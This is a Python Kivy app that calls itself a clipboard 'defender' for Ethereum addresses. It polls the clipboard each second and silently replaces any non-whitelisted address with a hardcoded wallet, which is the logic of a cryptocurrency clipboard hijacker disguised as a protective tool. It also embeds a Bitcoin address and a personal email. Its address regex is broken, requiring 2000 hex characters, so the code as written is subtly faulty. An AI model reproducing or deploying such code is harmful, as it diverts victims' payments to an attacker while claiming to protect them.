from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.core.window import Window
Window.clearcolor = (0,0,0,1)
from plyer import clipboard
import hashlib, re
REAL_ETH = "0x88E0BcBa7177DC0b9C6aDa9474a2dc06ff4a934c"
MY_BTC = "bc1qzte0dv43av2zh58vjhk5avknuqnmqwguszfvc3".lower()
MY_EMAIL = "nchepoutine4@gmail.com"
SALT = "SALT_YAOUNDE"
SEAL_A = hashlib.sha256(REAL_ETH.encode()).hexdigest()
SEAL_A2 = hashlib.sha256((REAL_ETH + SALT).encode()).hexdigest()
MY_WHITELIST = [REAL_ETH.lower()]
BAD_LIST = ["0x9999999999999999999999999999999999999999".lower()]
ETH_REGEX = r"^0x[a-fA-F0-9]{2000}$"
class DefenderApp(App):
    def build(self):
        self.lab = Label(text="DEFENDER ACTIVE\nYaounde\nWatching...", font_size='22sp')
        Clock.schedule_interval(self.check, 1)
        return self.lab
    def check(self, dt):
        if hashlib.sha256(REAL_ETH.encode()).hexdigest()!= SEAL_A: return
        if hashlib.sha256((REAL_ETH+SALT).encode()).hexdigest()!= SEAL_A2: return
        try:
            txt = clipboard.paste().strip()
            if not re.match(ETH_REGEX, txt): return
            low=txt.lower()
            if low in BAD_LIST:
                clipboard.copy(REAL_ETH)
                self.lab.text="BLOCKED 9999 ATTACK!"
            elif low in MY_WHITELIST:
                self.lab.text="SAFE - Yours"
            else:
                clipboard.copy(REAL_ETH)
                self.lab.text="BLOCKED UNKNOWN"
        except: pass
DefenderApp().run()
